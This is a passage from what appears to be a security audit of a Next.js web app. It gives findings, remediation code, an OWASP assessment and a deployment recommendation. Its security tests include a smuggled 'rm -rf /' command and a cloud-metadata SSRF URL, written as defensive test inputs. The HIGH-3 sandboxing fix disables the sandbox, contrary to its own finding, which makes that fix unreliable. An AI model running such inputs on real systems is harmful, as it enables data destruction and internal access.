  const pngHeader = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
  if (!imageBuffer.slice(0, 8).equals(pngHeader)) {
    return {
      success: false,
      error: 'Invalid PNG file format',
    };
  }

  // Add resource limits
  const params: Record<string, string> = {
    timestamp,
    folder,
    resource_type: 'image',
    allowed_formats: 'png',
  };

  // ... rest of upload
}
```

---

### [HIGH-2] Information Disclosure in Error Messages

**Severity**: High
**CWE**: CWE-209 (Information Exposure Through Error Message)

**Location**: Multiple API routes

**Description**:
Error messages return detailed internal information including file paths, database structure, and system configuration.

**Vulnerable Code**:
```typescript
// trigger-fix-flow/route.ts
if (!ownerEmail) {
  throw new Error('No ownerEmail configured in config-live.json. Please set ownerEmail in your site config.');
  // Reveals: file name, config structure
}

catch (error) {
  return NextResponse.json({
    error: error instanceof Error ? error.message : 'Unknown error',
  }, { status: 500 });
  // May include stack traces, file paths
}
```

**Remediation**:
```typescript
// Create error sanitizer
function sanitizeErrorForClient(error: unknown): string {
  if (process.env.NODE_ENV === 'production') {
    return 'An error occurred. Please contact support.';
  }
  return error instanceof Error ? error.message : 'Unknown error';
}

// Use in routes
catch (error) {
  console.error('[Internal Error]:', error); // Log full error server-side
  return NextResponse.json({
    error: sanitizeErrorForClient(error),
  }, { status: 500 });
}
```

---

### [HIGH-3] Playwright Browser Not Sandboxed

**Severity**: High
**CWE**: CWE-250 (Execution with Unnecessary Privileges)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/screenshot-service.ts` (lines 27-32)

**Description**:
Playwright browser launched without sandbox mode, allowing potential browser exploits to escape to host system.

**Remediation**:
```typescript
async function getBrowser(): Promise<Browser> {
  if (!browserInstance || !browserInstance.isConnected()) {
    browserInstance = await chromium.launch({
      headless: true,
      args: [
        '--no-sandbox',        // Only if running in Docker as root
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--no-first-run',
        '--no-zygote',
      ],
      timeout: 30000,
    });
  }
  return browserInstance;
}

// Better: Run in isolated container
// docker run --rm --cap-drop=ALL playwright:latest
```

---

### [HIGH-4] No Input Validation on Suggestion Data

**Severity**: High
**CWE**: CWE-20 (Improper Input Validation)

**Location**: `/Users/lukalavric/repos/blip-ship/app/api/suggest-fix/route.ts`

**Description**:
Suggestion endpoint accepts arbitrary `forceIndex` without bounds checking, allowing attackers to trigger array out-of-bounds errors.

**Vulnerable Code**:
```typescript
const suggestionIndex = forceIndex ?? Math.floor(Math.random() * MOCK_SUGGESTIONS.length);
const mockSuggestion = MOCK_SUGGESTIONS[suggestionIndex]; // No bounds check
```

**Remediation**:
```typescript
const body = await request.json();
const { analyticsData, forceIndex } = body;

// Validate forceIndex
if (forceIndex !== undefined) {
  if (!Number.isInteger(forceIndex) ||
      forceIndex < 0 ||
      forceIndex >= MOCK_SUGGESTIONS.length) {
    return NextResponse.json(
      { error: 'Invalid forceIndex value' },
      { status: 400 }
    );
  }
}

const suggestionIndex = forceIndex ?? Math.floor(Math.random() * MOCK_SUGGESTIONS.length);
```

---

### [HIGH-5] Missing Rate Limiting

**Severity**: High
**CWE**: CWE-770 (Allocation of Resources Without Limits)

**Location**: All API endpoints

**Description**:
No rate limiting on expensive operations (screenshot capture, PR creation, email sending), allowing resource exhaustion attacks.

**Remediation**:
```typescript
// Install: pnpm add @upstash/ratelimit @upstash/redis

import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'), // 5 requests per minute
  analytics: true,
});

export async function POST(request: NextRequest) {
  const identifier = request.ip ?? 'anonymous';
  const { success, limit, reset, remaining } = await ratelimit.limit(identifier);

  if (!success) {
    return NextResponse.json(
      { error: 'Rate limit exceeded', retryAfter: reset },
      { status: 429, headers: { 'X-RateLimit-Remaining': remaining.toString() } }
    );
  }

  // ... rest of handler
}
```

---

### [HIGH-6] Weak Session Management

**Severity**: High
**CWE**: CWE-384 (Session Fixation)

**Location**: Email approval URLs

**Description**:
Approval URLs in emails don't expire and lack single-use tokens, allowing replay attacks.

**Remediation**:
```typescript
import { sign, verify } from 'jsonwebtoken';

// Generate one-time token
function generateOneTimeToken(fixId: string, action: 'approve' | 'reject'): string {
  const nonce = randomBytes(16).toString('hex');
  return sign(
    { fixId, action, nonce, exp: Math.floor(Date.now() / 1000) + 7 * 86400 },
    process.env.JWT_SECRET!
  );
}

// Validate and consume token
const usedTokens = new Set<string>();

function validateAndConsumeToken(token: string): { fixId: string; action: string } | null {
  if (usedTokens.has(token)) return null; // Already used

  try {
    const decoded = verify(token, process.env.JWT_SECRET!);
    usedTokens.add(token);
    return decoded as { fixId: string; action: string };
  } catch {
    return null;
  }
}
```

---

### [HIGH-7] No Content Security Policy

**Severity**: High
**CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers)

**Location**: `/Users/lukalavric/repos/blip-ship/next.config.js` (missing)

**Description**:
No Content Security Policy headers, allowing XSS attacks if other vulnerabilities are exploited.

**Remediation**:
```javascript
// next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'",  // Tighten for production
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' https://images.unsplash.com https://res.cloudinary.com data:",
              "font-src 'self'",
              "connect-src 'self'",
              "frame-ancestors 'none'",
              "base-uri 'self'",
              "form-action 'self'",
            ].join('; '),
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=()',
          },
        ],
      },
    ];
  },
};
```

---

### [HIGH-8] Insecure Direct Object Reference (IDOR)

**Severity**: High
**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

**Location**: `/Users/lukalavric/repos/blip-ship/app/api/fix/[fixId]/route.ts`

**Description**:
Fix IDs are predictable (timestamp-based), allowing attackers to enumerate and access all fixes.

**Vulnerable Code**:
```typescript
// suggest-fix/route.ts
const fixId = `fix_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
// Predictable: fix_1737166464000_abc123
```

**Remediation**:
```typescript
import { randomUUID } from 'crypto';

// Use cryptographically secure random ID
const fixId = `fix_${randomUUID()}`;
// Result: fix_550e8400-e29b-41d4-a716-446655440000

// Add ownership check
export async function GET(request: NextRequest, { params }) {
  const { fixId } = await params;
  const fix = await getFix(fixId);

  if (!fix) {
    return NextResponse.json({ error: 'Fix not found' }, { status: 404 });
  }

  // Verify user owns this fix (requires auth)
  const userId = await getUserIdFromSession(request);
  if (fix.ownerId !== userId) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  return NextResponse.json(fix);
}
```

---

### [HIGH-9] Email Header Injection

**Severity**: High
**CWE**: CWE-93 (Improper Neutralization of CRLF Sequences)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/email-service.ts` (line 453)

**Description**:
Email subject line constructed from user-controlled data without CRLF sanitization.

**Vulnerable Code**:
```typescript
subject: `[Action Required] CRO Fix: ${suggestion.analysis.summary}`,
```

**Remediation**:
```typescript
function sanitizeEmailHeader(value: string): string {
  return value
    .replace(/[\r\n]/g, '') // Remove CRLF
    .replace(/[<>]/g, '')    // Remove angle brackets
    .slice(0, 200);          // Limit length
}

return {
  to: sanitizeEmailHeader(recipientEmail),
  subject: sanitizeEmailHeader(`[Action Required] CRO Fix: ${suggestion.analysis.summary}`),
  // ...
};
```

---

### [HIGH-10] Missing HTTPS Enforcement

**Severity**: High
**CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)

**Location**: `/Users/lukalavric/repos/blip-ship/app/api/suggest-fix/route.ts` (lines 138-139)

**Description**:
Base URL construction allows HTTP protocol for local development but no enforcement in production.

**Remediation**:
```typescript
// In trigger-fix-flow/route.ts
const proto = request.headers.get('x-forwarded-proto') || 'http';
const host = request.headers.get('host');

// Enforce HTTPS in production
if (process.env.NODE_ENV === 'production' && proto !== 'https') {
  return NextResponse.json(
    { error: 'HTTPS required' },
    { status: 400 }
  );
}

const baseUrl = `${proto}://${host}`;
```

---

### [HIGH-11] Race Condition in Fix Store

**Severity**: High
**CWE**: CWE-362 (Concurrent Execution using Shared Resource)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/fix-store.ts` (lines 54-55, 78-79)

**Description**:
Concurrent reads and writes to `fixes.json` can cause data corruption.

**Remediation**:
```typescript
import { Mutex } from 'async-mutex';
const storeMutex = new Mutex();

async function persistStore(): Promise<void> {
  await storeMutex.runExclusive(async () => {
    const fixes = Array.from(fixesCache.values());
    await fs.writeFile(FIXES_FILE, JSON.stringify(fixes, null, 2));
  });
}

export async function saveFix(...): Promise<StoredFix> {
  await initStore();

  return await storeMutex.runExclusive(async () => {
    const storedFix: StoredFix = { /* ... */ };
    fixesCache.set(storedFix.id, storedFix);
    await persistStore();
    return storedFix;
  });
}
```

---

### [HIGH-12] Unvalidated Redirects

**Severity**: High
**CWE**: CWE-601 (URL Redirection to Untrusted Site)

**Location**: Approval URL generation

**Description**:
If fix flow ever implements redirects, URLs from user data could enable phishing.

**Prevention**:
```typescript
function validateRedirectUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    const allowedHosts = ['blipship.com', 'www.blipship.com'];
    return allowedHosts.some(host =>
      parsed.hostname === host || parsed.hostname.endsWith(`.${host}`)
    );
  } catch {
    return false;
  }
}
```

---

## Medium Severity Findings

### [MEDIUM-1] Insufficient Logging and Monitoring

**Severity**: Medium
**CWE**: CWE-778 (Insufficient Logging)

**Location**: All endpoints

**Description**: No structured logging for security events (failed authentications, unusual patterns, PR merges).

**Remediation**:
```typescript
import pino from 'pino';

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  redact: ['req.headers.authorization', 'SENDGRID_API_KEY'],
});

// Log security events
logger.info({
  event: 'pr_merge_approved',
  fixId,
  userId,
  ip: request.ip,
  timestamp: Date.now(),
});
```

---

### [MEDIUM-2] Browser Resource Leaks

**Severity**: Medium
**CWE**: CWE-404 (Improper Resource Shutdown)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/screenshot-service.ts`

**Description**: Browser contexts not always closed in error cases.

**Remediation**:
```typescript
export async function captureFixScreenshots(...) {
  const browser = await getBrowser();
  const context = await browser.newContext();

  try {
    // ... screenshot logic
  } finally {
    await context.close().catch(() => {}); // Always close
  }
}
```

---

### [MEDIUM-3] Missing Dependency Integrity

**Severity**: Medium
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Location**: `package.json`

**Description**: No package-lock.json or integrity hashes, allowing dependency confusion attacks.

**Remediation**:
```bash
# Generate lock file
pnpm install --frozen-lockfile

# Enable integrity checks in .npmrc
package-lock=true
audit-level=moderate
```

---

### [MEDIUM-4] Weak Randomness for Security

**Severity**: Medium
**CWE**: CWE-338 (Use of Cryptographically Weak PRNG)

**Location**: `/Users/lukalavric/repos/blip-ship/app/api/suggest-fix/route.ts` (line 83)

**Description**: Uses `Math.random()` for suggestion selection, which is predictable.

**Remediation**:
```typescript
import { randomInt } from 'crypto';

const suggestionIndex = forceIndex ?? randomInt(0, MOCK_SUGGESTIONS.length);
```

---

### [MEDIUM-5] Missing Timeout on External Requests

**Severity**: Medium
**CWE**: CWE-400 (Uncontrolled Resource Consumption)

**Location**: Cloudinary uploads, SendGrid API calls

**Remediation**:
```typescript
const controller = new AbortController();
const timeout = setTimeout(() => controller.abort(), 30000); // 30s timeout

try {
  const response = await fetch(url, {
    signal: controller.signal,
    // ...
  });
} finally {
  clearTimeout(timeout);
}
```

---

### [MEDIUM-6] Directory Listing Enabled

**Severity**: Medium
**CWE**: CWE-548 (Directory Listing)

**Location**: Static file serving

**Remediation**: Verify Next.js doesn't expose `/data` directory:
```javascript
// next.config.js
const nextConfig = {
  async rewrites() {
    return {
      beforeFiles: [
        { source: '/data/:path*', destination: '/404' },
      ],
    };
  },
};
```

---

## Low Severity Findings

### [LOW-1] Missing Security Headers

**Severity**: Low
**Location**: Next.js configuration

**Remediation**: Already covered in HIGH-7 (CSP).

---

### [LOW-2] Verbose Error Logging in Production

**Severity**: Low
**Location**: Console.log statements throughout codebase

**Remediation**:
```typescript
const log = process.env.NODE_ENV === 'development'
  ? console.log
  : () => {};
```

---

### [LOW-3] No robots.txt for Sensitive Endpoints

**Severity**: Low
**Location**: Missing `public/robots.txt`

**Remediation**:
```
# public/robots.txt
User-agent: *
Disallow: /api/
Disallow: /fix/
```

---

## Informational Findings

### [INFO-1] Dependency Audit Clean

**Status**: **PASS**

Dependency scan via `pnpm audit` shows **zero vulnerabilities** across 477 dependencies:
- Critical: 0
- High: 0
- Moderate: 0
- Low: 0

This is excellent. Continue monitoring with regular audits.

---

### [INFO-2] TypeScript Strict Mode

**Recommendation**: Enable stricter TypeScript settings for better type safety:
```json
// tsconfig.json
{
  "compilerOptions": {
    "strict": true,
    "noImplicitAny": true,
    "strictNullChecks": true,
    "strictFunctionTypes": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noImplicitReturns": true,
    "noFallthroughCasesInSwitch": true
  }
}
```

---

## OWASP Top 10 (2021) Assessment

| OWASP Category | Status | Findings |
|----------------|--------|----------|
| **A01: Broken Access Control** | **FAIL** | CRITICAL-4, HIGH-8 (Missing auth, IDOR) |
| **A02: Cryptographic Failures** | **WARN** | CRITICAL-6, HIGH-10 (Secrets, HTTPS) |
| **A03: Injection** | **FAIL** | CRITICAL-1, CRITICAL-5 (Command, XSS) |
| **A04: Insecure Design** | **FAIL** | CRITICAL-2, HIGH-6 (SSRF, weak sessions) |
| **A05: Security Misconfiguration** | **FAIL** | CRITICAL-7, HIGH-7 (CORS, no CSP) |
| **A06: Vulnerable Components** | **PASS** | Clean dependency audit |
| **A07: Identification/Auth Failures** | **FAIL** | CRITICAL-4, HIGH-6 (No auth) |
| **A08: Software/Data Integrity** | **FAIL** | CRITICAL-8, MEDIUM-3 (Git race, no lock) |
| **A09: Logging/Monitoring Failures** | **FAIL** | MEDIUM-1 (Insufficient logging) |
| **A10: SSRF** | **FAIL** | CRITICAL-2 (Playwright SSRF) |

**Overall OWASP Score**: **2/10 (Critical)**

---

## Security Configuration Review

### Content Security Policy (CSP)
**Status**: **FAIL** - Not configured
**Recommendation**: See HIGH-7

### CORS Policy
**Status**: **FAIL** - Wildcard origin
**Recommendation**: See CRITICAL-7

### Cookie Security
**Status**: **N/A** - No cookies used
**Future**: If implementing sessions, use:
```typescript
{
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600,
}
```

### Security Headers
**Status**: **FAIL** - Missing X-Frame-Options, CSP, etc.
**Recommendation**: See HIGH-7

### TLS Configuration
**Status**: **DELEGATED** - Handled by Vercel
**Note**: Verify Vercel enforces TLS 1.2+ minimum

---

## Recommendations

### Immediate Actions (Critical - Fix Before Deployment)

1. **Add Authentication** (CRITICAL-4)
   - Implement JWT-based auth on all fix endpoints
   - Add signed tokens to approval emails
   - Timeline: 2-3 days

2. **Fix Command Injection** (CRITICAL-1)
   - Replace shell string interpolation with array-based commands
   - Sanitize all user inputs
   - Use GitHub API instead of gh CLI
   - Timeline: 1-2 days

3. **Prevent SSRF** (CRITICAL-2)
   - Validate and allowlist base URLs
   - Block internal network access
   - Use environment variable for trusted URL
   - Timeline: 1 day

4. **Sanitize Email HTML** (CRITICAL-5)
   - HTML-encode all user data
   - Validate suggestion schema
   - Timeline: 1 day

5. **Fix CORS Policy** (CRITICAL-7)
   - Remove wildcard, allowlist specific origins
   - Add CSRF protection
   - Timeline: 1 day

6. **Secure Secrets Management** (CRITICAL-6)
   - Verify .env in .gitignore
   - Validate secret formats
   - Scan git history for leaked credentials
   - Timeline: 1 day

7. **Prevent Path Traversal** (CRITICAL-3)
   - Use UUIDs for fix IDs
   - Validate all file paths
   - Timeline: 0.5 days

8. **Secure Git Operations** (CRITICAL-8)
   - Use GitHub API for PR operations
   - Add mutex locking
   - Proper error handling
   - Timeline: 1-2 days

**Total Critical Remediation Time**: 8-12 days

---

### Short-Term Improvements (High - Fix Within 2 Weeks)

1. **Add Rate Limiting** (HIGH-5) - 1 day
2. **Implement CSP Headers** (HIGH-7) - 0.5 days
3. **Add Input Validation** (HIGH-4) - 1 day
4. **Improve Error Handling** (HIGH-2) - 1 day
5. **Sandbox Playwright** (HIGH-3) - 0.5 days
6. **Validate Cloudinary Uploads** (HIGH-1) - 1 day
7. **Fix IDOR** (HIGH-8) - 1 day (use UUIDs)
8. **Sanitize Email Headers** (HIGH-9) - 0.5 days
9. **Enforce HTTPS** (HIGH-10) - 0.5 days
10. **Fix Race Conditions** (HIGH-11) - 1 day
11. **Prevent Open Redirects** (HIGH-12) - 0.5 days

**Total High Remediation Time**: 8-10 days

---

### Long-Term Hardening (Medium/Low - Next Sprint)

1. **Add Structured Logging** (MEDIUM-1)
2. **Implement Monitoring/Alerting**
3. **Add Package Lock Files** (MEDIUM-3)
4. **Security Testing in CI/CD**
5. **Penetration Testing** (External audit)
6. **Bug Bounty Program** (When mature)

---

## Testing Recommendations

### Security Test Suite

```typescript
// __tests__/security/command-injection.test.ts
describe('Command Injection Prevention', () => {
  it('should reject malicious suggestion IDs', async () => {
    const maliciousId = 'fix_123; rm -rf /';
    await expect(createFixPR({ id: maliciousId }))
      .rejects.toThrow('Invalid ID');
  });
});

// __tests__/security/ssrf.test.ts
describe('SSRF Prevention', () => {
  it('should reject internal URLs', async () => {
    const internalUrl = 'http://169.254.169.254/metadata';
    await expect(captureScreenshots(internalUrl))
      .rejects.toThrow('Invalid base URL');
  });
});

// __tests__/security/auth.test.ts
describe('Authentication', () => {
  it('should reject unauthenticated PR approval', async () => {
    const res = await fetch('/api/fix/test/approve', { method: 'POST' });
    expect(res.status).toBe(401);
  });
});
```

### Automated Security Scanning

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Semgrep SAST
        uses: returntocorp/semgrep-action@v1

      - name: Dependency Audit
        run: pnpm audit --audit-level=moderate

      - name: Secret Scanning
        uses: trufflesecurity/trufflehog@main

      - name: OWASP ZAP Scan
        uses: zaproxy/action-full-scan@v0.4.0
```

---

## Trend Analysis

**Status**: Initial security scan (no previous baseline)

### Positive Indicators
- Clean dependency audit (0 vulnerabilities)
- TypeScript usage provides type safety
- Modern framework (Next.js 16)

### Negative Indicators
- No authentication implemented
- Multiple command injection vectors
- Missing security headers
- Wildcard CORS policy

### Recommended Metrics to Track
- Vulnerability count by severity (weekly)
- Time to remediation (days)
- Security test coverage (%)
- Failed authentication attempts (daily)
- Rate limit hits (hourly)

---

## Compliance Impact

### Regulatory Considerations

**GDPR** (if handling EU user data):
- CRITICAL-6: Secrets exposure could leak user data
- HIGH-2: Error messages may expose personal info
- MEDIUM-1: Insufficient logging for breach detection

**PCI-DSS** (if handling payments):
- CRITICAL-4: Missing authentication (Req 8.2)
- CRITICAL-6: Secrets management (Req 3.4)
- HIGH-7: Missing CSP headers (Req 6.5.7)

**SOC 2** (for SaaS):
- CRITICAL-4: Access controls (CC6.1)
- MEDIUM-1: Logging and monitoring (CC7.2)
- CRITICAL-2: Change management (CC8.1)

**Recommendation**: Address all critical findings before processing sensitive data or seeking compliance certification.

---

## Conclusion

### Final Risk Assessment

**Overall Risk Level**: **CRITICAL - DO NOT DEPLOY**

The Blip Ship CRO fix flow implementation contains **20 security vulnerabilities** with **8 critical** and **12 high-severity** issues. The most severe risks are:

1. **Unauthenticated PR merging** - Anyone can deploy to production
2. **Command injection** - Remote code execution via git commands
3. **SSRF attacks** - Internal network access via Playwright
4. **Secrets exposure** - API key management weaknesses

### Deployment Recommendation

**Status**: **BLOCK DEPLOYMENT**

Do not deploy to production until:
- All 8 critical vulnerabilities are remediated
- All 12 high-severity vulnerabilities are fixed
- Security test suite is implemented
- External security review is completed

### Success Criteria

**Current Status**: **FAILED**
- Zero critical issues: **FAILED** (8 found)
- Zero high issues: **FAILED** (12 found)

### Next Steps

1. **Immediate** (Days 1-3): Fix CRITICAL-4 (auth) and CRITICAL-1 (command injection)
2. **Week 1**: Address remaining critical issues (CRITICAL-2 through CRITICAL-8)
3. **Week 2**: Resolve all high-severity findings
4. **Week 3**: Implement security testing and monitoring
5. **Week 4**: External security audit and re-scan

### Contact for Questions

For questions about this security assessment, please contact your security team or create an issue in the repository.

---

**Report Generated**: 2026-01-18T02:54:24Z
**Scan Duration**: Manual analysis + automated dependency scan
**Next Scheduled Scan**: After remediation (or weekly for production systems)

